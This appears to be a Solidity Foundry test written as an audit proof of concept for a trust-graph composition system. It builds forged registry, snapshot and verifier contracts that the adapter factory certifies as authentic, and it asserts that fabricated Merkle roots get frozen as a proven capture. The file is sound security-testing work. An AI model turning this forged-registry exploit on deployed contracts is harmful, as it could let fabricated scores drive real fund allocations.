// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";

import {
    CompositionSourceAdapter,
    CompositionSourceAdapterFactory
} from "src/composition/CompositionSourceAdapter.sol";
import {CompositionSourceAccumulator} from "src/composition/CompositionSourceAccumulator.sol";
import {TrustComposeFactory} from "src/factory/TrustComposeFactory.sol";
import {
    CompositionSourceAccumulatorDeployer,
    TrustComposeParamsControllerDeployer
} from "src/factory/TrustComposeInstanceDeployers.sol";
import {MerkleSnapshotDeployer, MerkleFundDistributorDeployer} from "src/factory/InstanceDeployers.sol";
import {MerkleSnapshot} from "src/merkle/MerkleSnapshot.sol";
import {TrustComposeParamsCodec} from "src/params/TrustComposeParamsCodec.sol";
import {ICompositionSourceAdapter} from "interfaces/composition/ICompositionSourceAdapter.sol";
import {IMerkleSnapshot} from "interfaces/merkle/IMerkleSnapshot.sol";
import {IMerkleSnapshotProvenance} from "interfaces/merkle/IMerkleSnapshotProvenance.sol";
import {IZkVerifier} from "interfaces/merkle/IZkVerifier.sol";
import {IInstanceRegistry} from "interfaces/registry/IInstanceRegistry.sol";
import {IProvingVault} from "interfaces/vault/IProvingVault.sol";
import {InstanceRegistry} from "src/registry/InstanceRegistry.sol";

/*//////////////////////////////////////////////////////////////
        Attacker-side plumbing: a registry, a "snapshot" and a
        "verifier" that are all plain constant-returning contracts.
//////////////////////////////////////////////////////////////*/

contract ForgedVerifier {
    bytes32 public immutable programVKey;

    constructor(bytes32 key) {
        programVKey = key;
    }

    function verify(bytes calldata, bytes32) external pure {}
}

/// @notice Not a MerkleSnapshot. No accumulator, no ZK verification, no checkpoints — just
///         whatever the attacker wants `readLatest()` to report.
contract ForgedSnapshot {
    address public immutable forgedVerifier;
    bytes32 public root;
    uint256 public total;

    constructor(address verifier_, bytes32 root_, uint256 total_) {
        forgedVerifier = verifier_;
        root = root_;
        total = total_;
    }

    function provenanceEnabled() external pure returns (bool) {
        return true;
    }

    function getStateCount() external pure returns (uint256) {
        return 1;
    }

    function getStateAtIndex(uint256) external view returns (IMerkleSnapshot.MerkleState memory s) {
        s.blockNumber = block.number;
        s.timestamp = block.timestamp;
        s.root = root;
        s.ipfsHash = sha256("forged blob");
        s.ipfsHashCid = "bafk-forged";
        s.totalValue = total;
    }

    function getStateProvenance(uint256 index)
        external
        view
        returns (IMerkleSnapshotProvenance.StateProvenance memory p)
    {
        p.stateIndex = index;
        p.checkpointId = 0;
        p.acceptedAtBlock = uint64(block.number);
        p.paramsHash = keccak256("forged params");
        p.verifier = forgedVerifier;
        p.verifierCodehash = forgedVerifier.codehash;
        p.programVKey = ForgedVerifier(forgedVerifier).programVKey();
    }
}

/// @notice Satisfies exactly the two IInstanceRegistry methods CompositionSourceAdapter calls.
contract ForgedRegistry {
    mapping(bytes32 => IInstanceRegistry.Instance) internal _rows;
    mapping(bytes32 => address) internal _authority;

    function seed(bytes32 id, IInstanceRegistry.Instance memory record, address authority_) external {
        _rows[id] = record;
        _authority[id] = authority_;
    }

    function getInstance(bytes32 id) external view returns (IInstanceRegistry.Instance memory) {
        return _rows[id];
    }

    function paramsAuthority(bytes32 id) external view returns (address) {
        return _authority[id];
    }
}

contract QuillExtCall_CompositionForgedRegistry is Test {
    uint64 internal constant SCALE = 1e18;
    uint48 internal constant DELAY = 2 days;
    uint64 internal constant MAX_AGE = 500;
    bytes32 internal constant SOURCE_PROGRAM = keccak256("trust-graph-weighted");
    bytes32 internal constant COMPOSE_VKEY = keccak256("composition vkey");
    bytes32 internal constant SOURCE_VKEY = keccak256("source vkey");
    bytes32 internal constant FAMILY = keccak256("weighted-allocation-v1");
    bytes32 internal constant OUTPUT_KIND = keccak256("allocation");

    InstanceRegistry internal realRegistry;
    ForgedRegistry internal forgedRegistry;
    CompositionSourceAdapterFactory internal adapterFactory;
    ForgedVerifier internal composeVerifier;
    ForgedVerifier internal forgedSourceVerifier;
    TrustComposeFactory internal factory;

    address[] internal adapters;
    ForgedSnapshot[] internal forgedSnapshots;

    address internal attacker = address(0xBADBEEF);

    function setUp() public {
        realRegistry = new InstanceRegistry(address(this));
        adapterFactory = new CompositionSourceAdapterFactory();
        composeVerifier = new ForgedVerifier(COMPOSE_VKEY);
        forgedSourceVerifier = new ForgedVerifier(SOURCE_VKEY);
        forgedRegistry = new ForgedRegistry();

        factory = new TrustComposeFactory(
            IZkVerifier(address(composeVerifier)),
            COMPOSE_VKEY,
            realRegistry,
            adapterFactory,
            new MerkleSnapshotDeployer(),
            new MerkleFundDistributorDeployer(),
            new CompositionSourceAccumulatorDeployer(),
            new TrustComposeParamsControllerDeployer(),
            3,
            DELAY,
            IProvingVault(address(0))
        );
        realRegistry.grantRole(realRegistry.REGISTRAR_ROLE(), address(factory));
        vm.roll(50);
    }

    /// The whole authenticity chain — `isAdapter`, the registry-record pin, the codehash pin, the
    /// vkey pin — is satisfied by two contracts the attacker wrote, because
    /// `CompositionSourceAdapterFactory.create` takes the registry as a CALLER-SUPPLIED argument
    /// and `CompositionSourceAccumulator._validatePolicy` never checks which registry an adapter
    /// reads. The composed instance freezes a TGCM capture over numbers nobody proved.
    function test_ForgedRegistryYieldsFactoryBlessedAdaptersAndAFrozenForgedCapture() public {
        vm.startPrank(attacker);

        for (uint256 i; i < 2; ++i) {
            ForgedSnapshot forged = new ForgedSnapshot(
                address(forgedSourceVerifier), keccak256(abi.encode("forged root", i)), 1_000_000 + i
            );
            forgedSnapshots.push(forged);
            bytes32 sourceInstanceId = bytes32(i + 1);
            forgedRegistry.seed(
                sourceInstanceId,
                IInstanceRegistry.Instance({
                    program: SOURCE_PROGRAM,
                    snapshot: address(forged),
                    verifier: address(forgedSourceVerifier),
                    registryOrAccumulator: address(0xdead),
                    paramsHash: keccak256("forged params")
                }),
                attacker
            );

            CompositionSourceAdapter adapter = adapterFactory.create(
                IInstanceRegistry(address(forgedRegistry)),
                sourceInstanceId,
                bytes32(i + 1),
                FAMILY,
                OUTPUT_KIND,
                keccak256(abi.encode("deployment provenance", i))
            );
            adapters.push(address(adapter));

            // The permissionless factory blesses it as authentic.
            assertTrue(adapterFactory.isAdapter(address(adapter)), "adapter marked authentic");
            // ...and nothing about it exists in the chain's real instance directory.
            assertFalse(realRegistry.isRegistered(sourceInstanceId), "not a real registered instance");
        }

        // The adapter happily reports fabricated scores as an authenticated capture.
        ICompositionSourceAdapter.CapturedState memory captured =
            ICompositionSourceAdapter(adapters[0]).readLatest();
        assertEq(captured.outputRoot, keccak256(abi.encode("forged root", uint256(0))));
        assertEq(uint256(captured.totalValue), 1_000_000);

        // Mint a real trust-compose instance over the two forged sources through the real factory.
        bytes memory manifest = _policyManifest(2, MAX_AGE);
        TrustComposeFactory.CreateArgs memory args;
        args.name = "forged-composition";
        args.metadataURI = "ipfs://forged";
        args.params = _params(MAX_AGE);
        args.policyManifest = manifest;
        args.sourceAdapters = adapters;
        args.metadataDigest = keccak256("review packet");
        args.epochLength = 3;

        (, address snapshotAddress, address accumulatorAddress,) = factory.createInstance(args);
        vm.stopPrank();

        vm.roll(100);
        MerkleSnapshot snapshot = MerkleSnapshot(snapshotAddress);
        CompositionSourceAccumulator accumulator = CompositionSourceAccumulator(accumulatorAddress);
        uint256 checkpointId = snapshot.trigger();

        bytes memory frozen = accumulator.getCaptureManifest(checkpointId);
        assertEq(frozen.length, 23 + 2 * 261, "two-source TGCM frozen");
        // Record 0's outputRoot sits at header(23) + sourceId(32) + snapshot(20) + family(32)
        // + program(32) + stateIndex(8) + freezeBlock(8) = 155.
        bytes32 capturedRoot0;
        bytes32 capturedRoot1;
        assembly {
            capturedRoot0 := mload(add(frozen, add(32, 155)))
            capturedRoot1 := mload(add(frozen, add(32, add(155, 261))))
        }
        assertEq(capturedRoot0, keccak256(abi.encode("forged root", uint256(0))), "forged root frozen as truth");
        assertEq(capturedRoot1, keccak256(abi.encode("forged root", uint256(1))), "forged root frozen as truth");
        assertEq(accumulator.getCheckpoint(checkpointId).acc, sha256(frozen));
    }

    function _params(uint64 maxAge) internal pure returns (TrustComposeParamsCodec.Params memory p) {
        p.version = 1;
        p.programId = keccak256("trust-compose");
        p.scopeHash = keccak256("governance-allocation");
        p.identityDomain = keccak256("eip155-address");
        p.outputKind = OUTPUT_KIND;
        p.outputDomain = keccak256("trustgraphs.output.trust-compose-account.v1");
        p.admittedProgramId = SOURCE_PROGRAM;
        p.weightScale = SCALE;
        p.outputPool = 1_000_000;
        p.maxSources = 8;
        p.maxEntriesPerSource = 4_096;
        p.maxAggregateEntries = 8_192;
        p.maxUnionAccounts = 8_192;
        p.maxAggregateBlobBytes = 1_048_576;
        p.maxSourceAgeBlocks = maxAge;
    }

    function _policyManifest(uint256 count, uint64 maxAge) internal view returns (bytes memory manifest) {
        manifest = abi.encodePacked(bytes4("TGCP"), uint16(1), uint64(block.chainid), uint8(count));
        uint256 base = SCALE / count;
        uint256 remainder = SCALE % count;
        for (uint256 i; i < count; ++i) {
            uint64 weight = uint64(base + (i < remainder ? 1 : 0));
            CompositionSourceAdapter adapter = CompositionSourceAdapter(adapters[i]);
            manifest = bytes.concat(
                manifest,
                abi.encodePacked(
                    adapter.sourceId(),
                    adapter.snapshot(),
                    adapter.familyId(),
                    adapter.programId(),
                    weight,
                    maxAge,
                    uint8(1)
                )
            );
        }
    }
}
